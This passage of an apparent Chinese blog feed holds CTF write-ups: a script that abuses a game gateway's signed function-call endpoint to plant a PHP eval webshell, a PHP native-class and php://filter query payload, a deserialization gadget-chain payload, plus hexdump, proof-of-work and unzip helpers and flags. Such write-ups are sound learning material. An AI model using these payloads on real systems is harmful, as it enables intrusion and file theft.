title="getshell"></a>getshell</h2><p>打开附件在<code>APMServ5.2.6&gt;www&gt;htdocs&gt;server&gt;game&gt;BattleNetGateway.php</code><br>可以看到存在漏洞，可以上传文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php   <br>require_once(<span class="hljs-string">&quot;interface.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;utils.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;HeroFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleNetServices.php&quot;</span>);<br>define(<span class="hljs-string">&quot;BATTLE_NET_KEY&quot;</span>,<span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span>);<br><span class="hljs-keyword">if</span> (!defined(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>)) &#123;<span class="hljs-keyword">if</span> (substr(PHP_OS, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) == <span class="hljs-string">&#x27;WIN&#x27;</span>) define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>); <span class="hljs-keyword">else</span> define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>);&#125; <br>ini_set(<span class="hljs-string">&#x27;include_path&#x27;</span>,ini_get(<span class="hljs-string">&#x27;include_path&#x27;</span>).PATH_SEPARATOR.realpath(<span class="hljs-string">&quot;../&quot;</span>));     <br><br>$param=$_POST;<br><span class="hljs-keyword">if</span>(empty($param))$param=$_GET;      <br>$from_uid=$param[<span class="hljs-string">&quot;from_uid&quot;</span>];   <br>$sign=$param[<span class="hljs-string">&quot;sign&quot;</span>];<br>$commandFunc=$param[<span class="hljs-string">&quot;commandFunc&quot;</span>];<br>$content=urldecode($param[<span class="hljs-string">&quot;content&quot;</span>]);<br>$content_encoding=$param[<span class="hljs-string">&quot;content-encoding&quot;</span>];<br>//$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY;<br><br><br><br>$ret=array();<br><span class="hljs-keyword">if</span>($sign!=md5($from_uid.$commandFunc.$content.BATTLE_NET_KEY)) <br>$ret[]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">else</span>&#123;<br>    $ret[]=<span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br>$inputParams=explode(<span class="hljs-string">&quot;|&quot;</span>,$content);<br><span class="hljs-keyword">if</span>(count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=$inputParams[<span class="hljs-number">0</span>];<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    $inputParams=json_decode($content,true);<br><span class="hljs-keyword">if</span>(is_array($inputParams)&amp;&amp;count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=array_shift($inputParams);<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams); <br>&#125;<br>&#125;catch(Exception $e)&#123;<br>    $ret = array(<span class="hljs-number">0</span>=&gt;<span class="hljs-number">0</span>);<br>$ret[] = $e-&gt;getMessage();<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br><span class="hljs-built_in">print</span> implode(<span class="hljs-string">&quot;|&quot;</span>,$ret);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-built_in">print</span> json_encode($ret);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>看到密钥</p><p><code>define(&quot;BATTLE_NET_KEY&quot;,&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;);</code><br>上传一个木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> sys<br><br>BATTLE_NET_KEY = <span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span> //key<br>data = &#123;<br>    <span class="hljs-string">&quot;from_uid&quot;</span>: <span class="hljs-string">&quot;a.php&quot;</span>,<br>    <span class="hljs-string">&quot;commandFunc&quot;</span>: <span class="hljs-string">&quot;file_put_contents&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&#x27;&lt;? eval($_POST[&#x27;</span>a<span class="hljs-string">&#x27;]);&#x27;</span>,  //一句话<br>    <span class="hljs-string">&quot;content-encoding&quot;</span>: <span class="hljs-string">&quot;csv&quot;</span><br>&#125;<br>data[<span class="hljs-string">&quot;sign&quot;</span>] = hashlib.md5((data[<span class="hljs-string">&quot;from_uid&quot;</span>]+data[<span class="hljs-string">&quot;commandFunc&quot;</span>]+data[<span class="hljs-string">&quot;content&quot;</span>]+BATTLE_NET_KEY).encode()).hexdigest()<br>t=requests.post(<span class="hljs-string">&quot;http://120.55.42.64:81/server/game/BattleNetGateway.php&quot;</span>, data=data)<br><span class="hljs-built_in">print</span>(t.text)<br></code></pre></td></tr></table></figure><p>蚁剑连接，flag在根目录下<br><img src="/mdimg/2022PWNHUB/5.jpeg"></p><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="Tcp-Show"><a href="#Tcp-Show" class="headerlink" title="Tcp Show"></a>Tcp Show</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><br>n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    d, rawdata = <span class="hljs-built_in">input</span>().strip().split()<br>    data = base64.b64decode(rawdata.encode())<br>    now = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">8</span><br>        now += <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) + <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                now += <span class="hljs-built_in">hex</span>(data[i + j])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">3</span><br>        now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                tmp = data[i + j]<br>                <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= tmp &lt;= <span class="hljs-number">126</span>:<br>                    now += <span class="hljs-built_in">chr</span>(tmp)<br>                <span class="hljs-keyword">else</span>:<br>                    now += <span class="hljs-string">&#x27;.&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>        now += <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-built_in">print</span>(now[:-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="垃圾邮件分析"><a href="#垃圾邮件分析" class="headerlink" title="垃圾邮件分析"></a>垃圾邮件分析</h2><p>爆破sha256脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-string">&#x27;sha256(vKyd2tRZFtkExhiNlPlVTduEqY47 + xxxx) = 4a39288b21b34650b177bdc58c416b3f55305945a9cf87f4bd7b4da2569c10e4&#x27;</span><br>suffix = data.split(<span class="hljs-string">&quot;(&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot; +&quot;</span>)[<span class="hljs-number">0</span>]<br>digest = data.split(<span class="hljs-string">&quot;= &quot;</span>)[<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA256<br><span class="hljs-keyword">import</span> itertools<br><br>ALPHABET = string.ascii_letters + string.digits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getProof</span>(<span class="hljs-params">suffix,digest</span>):   <br><br>    <span class="hljs-comment">#print(f&quot;suffix: &#123;suffix&#125;\ndigest: &#123;digest&#125;&quot;)</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(ALPHABET,repeat=<span class="hljs-number">4</span>):<br>        prefix = <span class="hljs-string">&#x27;&#x27;</span>.join(i)<br>        guess =  suffix + prefix<br>        <span class="hljs-keyword">if</span> sha256(guess.encode()).hexdigest() == digest:<br>            <span class="hljs-comment">#print(f&quot;Find X<span class="hljs-doctag">XXX:</span> &#123;prefix&#125;&quot;)</span><br>            <span class="hljs-keyword">return</span> prefix<br>            <span class="hljs-keyword">break</span><br><br>x = getProof(suffix,digest)<br><span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure><p>给50条数据来训练AI，然后给10条邮件让判断是垃圾邮件还是好的邮件<br>不会机器学习，纯靠翻译自己去判断，10条全对就拿到flag了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第2届山石CTF冬令营结营赛wp</title>
    <link href="/2023/02/05/%E7%AC%AC2%E5%B1%8A%E5%B1%B1%E7%9F%B3CTF%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9Bwp/"/>
    <url>/2023/02/05/%E7%AC%AC2%E5%B1%8A%E5%B1%B1%E7%9F%B3CTF%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/1.jpg"></p><h3 id="Primitive-php"><a href="#Primitive-php" class="headerlink" title="Primitive php"></a>Primitive php</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>highlight_file(__FILE__);<br>//hint.php<br>foreach ($_GET <span class="hljs-keyword">as</span> $value) &#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,$value))&#123;<br>        die(<span class="hljs-string">&quot;不可以看flag啦，阿sir&quot;</span>);<br>    &#125;<br><br>&#125;<br>$a = new $_GET[<span class="hljs-string">&#x27;class1&#x27;</span>]($_GET[<span class="hljs-string">&#x27;a&#x27;</span>]);$b = new $_GET[<span class="hljs-string">&#x27;class2&#x27;</span>]($_GET[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-keyword">if</span> ($a !== $b <span class="hljs-keyword">and</span> md5($a)===md5($b))<br>&#123;<br>    echo new $_GET[<span class="hljs-string">&#x27;class3&#x27;</span>]($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>原生类绕过：参考：<a href="https://blog.csdn.net/qq_63928796/article/details/127786521">https://blog.csdn.net/qq_63928796/article/details/127786521</a><br><code>?class2=Exception&amp;b=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class1=Exception&amp;a=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class3=SplFileObject&amp;c=php://filter/convert.base64-encode/resource=hint.php</code><br>filter流伪协议读到源码<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>echo <span class="hljs-string">&quot;no hint&quot;</span>;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">blue</span><br>&#123;<br>    public $b1;<br>    public $b2;<br><br>    function <span class="hljs-built_in">eval</span>() &#123;<br>        echo new $this-&gt;b1($this-&gt;b2);<br>    &#125;<br><br>    public function __invoke()<br>    &#123;<br>        $this-&gt;b1-&gt;blue();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">red</span><br>&#123;<br>    public $r1;<br><br>    public function __destruct()<br>    &#123;<br>        echo $this-&gt;r1 . <span class="hljs-string">&#x27;0xff0000&#x27;</span>;<br>    &#125;<br><br>    public function execute()<br>    &#123;<br>        ($this-&gt;r1)();<br>    &#125;<br><br>    public function __call($a, $b)<br>    &#123;<br>        echo $this-&gt;r1-&gt;getFlag();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">white</span><br>&#123;<br>    public $w;<br><br>    public function __toString()<br>    &#123;<br>        $this-&gt;w-&gt;execute();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">color</span><br>&#123;<br>    public $c1;<br><br>    public function execute()<br>    &#123;<br>        ($this-&gt;c1)();<br>    &#125;<br><br>    public function getFlag()<br>    &#123;<br>        echo file_get_contents($this-&gt;c1);<br>    &#125;<br><br>&#125;<br><br>unserialize($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>反序列化构造payload<br>参考：<br><a href="https://blog.csdn.net/cosmoslin/article/details/123829951">https://blog.csdn.net/cosmoslin/article/details/123829951</a><br>构造伪协议读取flag<code>php://filter/convert.base64-encode/resource=flag.php</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">blue</span><br>&#123;<br>    public $b1;<br>    public $b2;<br><br>    public function __construct($b1)<br>    &#123;<br>        $this-&gt;b1 = $b1;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">red</span><br>&#123;<br>    public $r1;<br><br>    public function __construct($r1)<br>    &#123;<br>        $this-&gt;r1 = $r1;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">white</span><br>&#123;<br>    public $w;<br><br>    public function __construct($w)<br>    &#123;<br>        $this-&gt;w = $w;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">color</span><br>&#123;<br>    public $c1;<br><br>    public function __construct($c1)<br>    &#123;<br>        $this-&gt;c1 = $c1;<br>    &#125;<br><br>&#125;<br>$f = new color(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>);  <br>$e = new red($f);<br>$d = new blue($e);<br>$c = new color($d);<br>$b = new white($c);<br>$a = new red($b);<br>echo (urlencode(serialize($a)));<br></code></pre></td></tr></table></figure><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/2.png"><br><code>unserialize($_POST[&#39;cmd&#39;]);</code>post传参cmd<br>payload：<br><code>cmd=O%3A3%3A%22red%22%3A1%3A%7Bs%3A2%3A%22r1%22%3BO%3A5%3A%22white%22%3A1%3A%7Bs%3A1%3A%22w%22%3BO%3A5%3A%22color%22%3A1%3A%7Bs%3A2%3A%22c1%22%3BO%3A4%3A%22blue%22%3A2%3A%7Bs%3A2%3A%22b1%22%3BO%3A3%3A%22red%22%3A1%3A%7Bs%3A2%3A%22r1%22%3BO%3A5%3A%22color%22%3A1%3A%7Bs%3A2%3A%22c1%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7Ds%3A2%3A%22b2%22%3BN%3B%7D%7D%7D%7D</code><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/3.png"><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/4.png"><br>:::tips<br>HSNCTF{537C532E-408B-FDCD-3E49-58E6FB578579}<br>:::</p><h3 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h3><p>用工具cloakify<br>kali：<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/5.png"><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/6.png"><br>打开保存的文件<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/7.png"><br>改后缀zip<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/8.png"><br>zip套娃，文件名递减1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><br>count = <span class="hljs-number">2331</span><br><span class="hljs-keyword">while</span> count&gt;<span class="hljs-number">0</span>:<br>    path = <span class="hljs-string">&#x27;f&#x27;</span>+ <span class="hljs-built_in">str</span>(count) + <span class="hljs-string">&#x27;.zip&#x27;</span><br>    folder_abs = <span class="hljs-string">&#x27;.&#x27;</span><br><br>    zip_file = zipfile.ZipFile(path)<br>    zip_list = zip_file.namelist()<br><br>    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> zip_list:<br>        zip_file.extract(f, folder_abs)<br>     <br>    zip_file.close()<br>    count -= <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>得到<img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/9.png"><br>:::tips<br>hsnctf{66eec912-e9ce-4e1d-ac54-ecea075dcb96}<br>:::</p><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/10.png"><br>:::tips<br>hsnctf{welcome_to_hsnctf}<br>:::</p><h3 id="外星电波"><a href="#外星电波" class="headerlink" title="外星电波~"></a>外星电波~</h3><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/11.png"><br>得到一个加密的压缩包<br>NTFS数据流加密<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/12.png"><br>得到音频，导出，sstv读<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/13.png"><br>解压缩包得到flag<br>:::tips<br>hsnctf{70995fb0-eb60-0787-f305-77066aeb6730}<br>:::</p><h3 id="daobudao"><a href="#daobudao" class="headerlink" title="daobudao"></a>daobudao</h3><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/14.png"><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/15.png"><br>:::tips<br>hsnctf{g00d_luck_have_fun}<br>:::</p><h3 id="S7-analysis"><a href="#S7-analysis" class="headerlink" title="S7_analysis"></a>S7_analysis</h3><p>随便翻翻，看见一个stop<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/16.png"><br>:::tips<br> hsnctf{399}<br>:::</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
